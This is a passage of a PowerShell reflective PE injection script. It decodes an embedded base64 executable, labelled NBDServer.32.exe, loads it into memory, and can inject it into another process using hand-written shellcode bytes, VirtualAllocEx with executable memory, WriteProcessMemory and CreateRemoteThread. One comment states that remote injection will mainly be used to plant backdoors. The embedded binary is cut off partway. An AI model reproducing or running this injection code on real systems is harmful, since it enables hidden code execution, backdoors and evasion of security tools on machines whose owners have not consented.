                Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
                $DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
                $DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
                $DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
                
                $DllMain.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
            }
            else
            {
                $DllMainPtr = Add-SignedIntAsUnsigned ($EffectivePEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
            
                if ($PEInfo.PE64Bit -eq $true)
                {
                    #Shellcode: CallDllMain.asm
                    $CallDllMainSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
                    $CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
                    $CallDllMainSC3 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
                }
                else
                {
                    #Shellcode: CallDllMain.asm
                    $CallDllMainSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
                    $CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
                    $CallDllMainSC3 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
                }
                $SCLength = $CallDllMainSC1.Length + $CallDllMainSC2.Length + $CallDllMainSC3.Length + ($PtrSize * 2)
                $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
                $SCPSMemOriginal = $SCPSMem
                
                Write-BytesToMemory -Bytes $CallDllMainSC1 -MemoryAddress $SCPSMem
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC1.Length)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectivePEHandle, $SCPSMem, $false)
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
                Write-BytesToMemory -Bytes $CallDllMainSC2 -MemoryAddress $SCPSMem
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC2.Length)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($DllMainPtr, $SCPSMem, $false)
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
                Write-BytesToMemory -Bytes $CallDllMainSC3 -MemoryAddress $SCPSMem
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC3.Length)
                
                $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
                if ($RSCAddr -eq [IntPtr]::Zero)
                {
                    Throw "Unable to allocate memory in the remote process for shellcode"
                }
                
                $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
                if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
                {
                    Throw "Unable to write shellcode to remote process memory."
                }

                $RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
                $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
                if ($Result -ne 0)
                {
                    Throw "Call to CreateRemoteThread to call GetProcAddress failed."
                }
                
                $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
            }
        }
        elseif ($PEInfo.FileType -ieq "EXE")
        {
            #Overwrite GetCommandLine and ExitProcess so we can provide our own arguments to the EXE and prevent it from killing the PS process
            [IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
            [System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)
            $OverwrittenMemInfo = Update-ExeFunctions -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -ExeArguments $ExeArgs -ExeDoneBytePtr $ExeDoneBytePtr

            #If this is an EXE, call the entry point in a new thread. We have overwritten the ExitProcess function to instead ExitThread
            #   This way the reflectively loaded EXE won't kill the powershell process when it exits, it will just kill its own thread.
            [IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
            Write-Verbose "Call EXE Main function. Address: $(Get-Hex $ExeMainPtr). Creating thread for the EXE to run in."

            $Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null

            while($true)
            {
                [Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr, 0)
                if ($ThreadDone -eq 1)
                {
                    Copy-ArrayOfMemAddresses -CopyInfo $OverwrittenMemInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants
                    Write-Verbose "EXE thread has completed."
                    break
                }
                else
                {
                    Start-Sleep -Seconds 1
                }
            }
        }
        
        return @($PEInfo.PEHandle, $EffectivePEHandle)
    }
    
    
    Function Invoke-MemoryFreeLibrary
    {
        Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        $PEHandle
        )
        
        #Get Win32 constants and functions
        $Win32Constants = Get-Win32Constants
        $Win32Functions = Get-Win32Functions
        $Win32Types = Get-Win32Types
        
        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
        
        #Call FreeLibrary for all the imports of the DLL
        if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
        {
            [IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
            
            while ($true)
            {
                $ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
                
                #If the structure is null, it signals that this is the end of the array
                if ($ImportDescriptor.Characteristics -eq 0 `
                        -and $ImportDescriptor.FirstThunk -eq 0 `
                        -and $ImportDescriptor.ForwarderChain -eq 0 `
                        -and $ImportDescriptor.Name -eq 0 `
                        -and $ImportDescriptor.TimeDateStamp -eq 0)
                {
                    Write-Verbose "Done unloading the libraries needed by the PE"
                    break
                }

                $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name)))
                $ImportDllHandle = $Win32Functions.GetModuleHandle.Invoke($ImportDllPath)

                if ($ImportDllHandle -eq $null)
                {
                    Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways" -WarningAction Continue
                }
                
                $Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)
                if ($Success -eq $false)
                {
                    Write-Warning "Unable to free library: $ImportDllPath. Continuing anyways." -WarningAction Continue
                }
                
                $ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
            }
        }
        
        #Call DllMain with process detach
        Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
        $DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
        $DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
        $DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
        
        $DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null
        
        
        $Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
        if ($Success -eq $false)
        {
            Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
        }
    }


    Function Main
    {
        $Win32Functions = Get-Win32Functions
        $Win32Types = Get-Win32Types
        $Win32Constants =  Get-Win32Constants
        
        $RemoteProcHandle = [IntPtr]::Zero
    
        #If a remote process to inject in to is specified, get a handle to it
        if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne ""))
        {
            Throw "Can't supply a ProcId and ProcName, choose one or the other"
        }
        elseif ($ProcName -ne $null -and $ProcName -ne "")
        {
            $Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)
            if ($Processes.Count -eq 0)
            {
                Throw "Can't find process $ProcName"
            }
            elseif ($Processes.Count -gt 1)
            {
                $ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId
                Write-Output $ProcInfo
                Throw "More than one instance of $ProcName found, please specify the process ID to inject in to."
            }
            else
            {
                $ProcId = $Processes[0].ID
            }
        }
        
        if (($ProcId -ne $null) -and ($ProcId -ne 0))
        {
            $RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
            if ($RemoteProcHandle -eq [IntPtr]::Zero)
            {
                Throw "Couldn't obtain the handle for process ID: $ProcId"
            }
            
            Write-Verbose "Got the handle for the remote process to inject in to"
        }
        

        #Load the PE reflectively
        Write-Verbose "Calling Invoke-MemoryLoadLibrary"

        if (((Get-WmiObject -Class Win32_Processor).AddressWidth / 8) -ne [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
        {
            Write-Error "PowerShell architecture (32bit/64bit) doesn't match OS architecture. 64bit PS must be used on a 64bit OS." -ErrorAction Stop
        }

        #Determine whether or not to use 32bit or 64bit bytes
        if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8)
        {
            [Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes64)
        }
        else
        {
            [Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes32)
        }
        $PEBytes[0] = 0
        $PEBytes[1] = 0
        $PEHandle = [IntPtr]::Zero
        if ($RemoteProcHandle -eq [IntPtr]::Zero)
        {
            $PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs
        }
        else
        {
            $PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle
        }
        if ($PELoadedInfo -eq [IntPtr]::Zero)
        {
            Throw "Unable to load PE, handle returned is NULL"
        }
        
        $PEHandle = $PELoadedInfo[0]
        $RemotePEHandle = $PELoadedInfo[1] #only matters if you loaded in to a remote process
        
        
        #Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.
        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
        if (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -eq [IntPtr]::Zero))
        {
            #########################################
            ### YOUR CODE GOES HERE
            #########################################
            switch ($FuncReturnType)
            {
                'WString' {
                    Write-Verbose "Calling function with WString return type"
                    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "WStringFunc"
                    if ($WStringFuncAddr -eq [IntPtr]::Zero)
                    {
                        Throw "Couldn't find function address."
                    }
                    $WStringFuncDelegate = Get-DelegateType @() ([IntPtr])
                    $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
                    [IntPtr]$OutputPtr = $WStringFunc.Invoke()
                    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)
                    Write-Output $Output
                }

                'String' {
                    Write-Verbose "Calling function with String return type"
                    [IntPtr]$StringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "StringFunc"
                    if ($StringFuncAddr -eq [IntPtr]::Zero)
                    {
                        Throw "Couldn't find function address."
                    }
                    $StringFuncDelegate = Get-DelegateType @() ([IntPtr])
                    $StringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($StringFuncAddr, $StringFuncDelegate)
                    [IntPtr]$OutputPtr = $StringFunc.Invoke()
                    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($OutputPtr)
                    Write-Output $Output
                }

                'Void' {
                    Write-Verbose "Calling function with Void return type"
                    [IntPtr]$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
                    if ($VoidFuncAddr -eq [IntPtr]::Zero)
                    {
                        Throw "Couldn't find function address."
                    }
                    $VoidFuncDelegate = Get-DelegateType @() ([Void])
                    $VoidFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VoidFuncAddr, $VoidFuncDelegate)
                    $VoidFunc.Invoke() | Out-Null
                }
            }
            #########################################
            ### END OF YOUR CODE
            #########################################
        }
        #For remote DLL injection, call a void function which takes no parameters
        elseif (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
        {
            $VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
            if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))
            {
                Throw "VoidFunc couldn't be found in the DLL"
            }
            
            $VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
            $VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle
            
            #Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors
            $RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
        }
        
        #Don't free a library if it is injected in a remote process or if it is an EXE.
        #Note that all DLL's loaded by the EXE will remain loaded in memory.
        if ($RemoteProcHandle -eq [IntPtr]::Zero -and $PEInfo.FileType -ieq "DLL")
        {
            Invoke-MemoryFreeLibrary -PEHandle $PEHandle
        }
        else
        {
            #Delete the PE file from memory.
            $Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
            if ($Success -eq $false)
            {
                Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
            }
        }
        
        Write-Verbose "Done!"
    }

    Main
}

#Main function to either run the script locally or remotely
Function Main
{
    if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
    {
        $DebugPreference  = "Continue"
    }

    if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
    {
        Write-Error "Script must be run as administrator!" -ErrorAction Stop
    }

    Write-Verbose "PowerShell ProcessID: $PID"

    # base64 -w 0 NBDServer.32.exe > NBDServer.32.b64
    $PEBytes32 = "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